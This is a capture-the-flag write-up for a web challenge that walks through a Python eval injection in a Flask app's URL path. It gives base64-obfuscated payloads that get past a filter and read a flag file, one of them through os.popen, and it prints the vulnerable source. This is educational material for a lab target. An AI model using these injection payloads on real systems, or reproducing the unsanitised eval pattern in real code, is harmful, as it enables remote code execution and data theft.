# Streamlining portal NG

Hi, packet inspector,

the AI has detected your previous breach and has improved the security measures. New streamlining portal is
on http://user-info-ng.mysterious-delivery.tcc.

Your task is to break into the improved web and find again interesting information on the server.

May the Packet be with you!

---

This challenge is a follow-up to [Streamlining portal](../01-streamlining-portal/README.md).

Obviously, the payload from the original challenge doesn't work here. It returns `404 NOT FOUND` so there is
some kind of new filter.

The first idea was to obfuscate the payload (`__import__('os').popen('cat /app/FLAG/flag.txt').read()`):

```
/hello/"+eval(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5wb3BlbignY2F0IC9hcHAvRkxBRy9mbGFnLnR4dCcpLnJlYWQoKQ=='.encode('ascii')))#

> Hello
```

It returns empty string. No error, just empty string. It works well for the original challenge.

After some tries and errors I changed the payload to `open("/app/FLAG/flag.txt", "r").read()`:

```
/hello/"+eval(__import__('base64').b64decode('b3BlbigiL2FwcC9GTEFHL2ZsYWcudHh0IiwgInIiKS5yZWFkKCk='.encode('ascii')))#

> Hello FLAG{OONU-Pm7V-BK3s-YftK}
```

---

## Bonus: Reading the source code

Read `/app/app.py`:

```python
from flask import Flask, Blueprint, redirect, render_template, abort

bp = Blueprint("app", __name__)


def create_app():
    app = Flask(__name__)
    app.register_blueprint(bp, url_prefix="/")
    return app


@bp.route('hello/<userstring>')
def hello(userstring):
    if 'cd ' in userstring:
        abort(403)
    message = eval('"Hello ' + userstring + '"')
    return render_template('index.html', message=message)


@bp.route('')
def redirect_to_user():
    return redirect("/hello/user", code=302)
```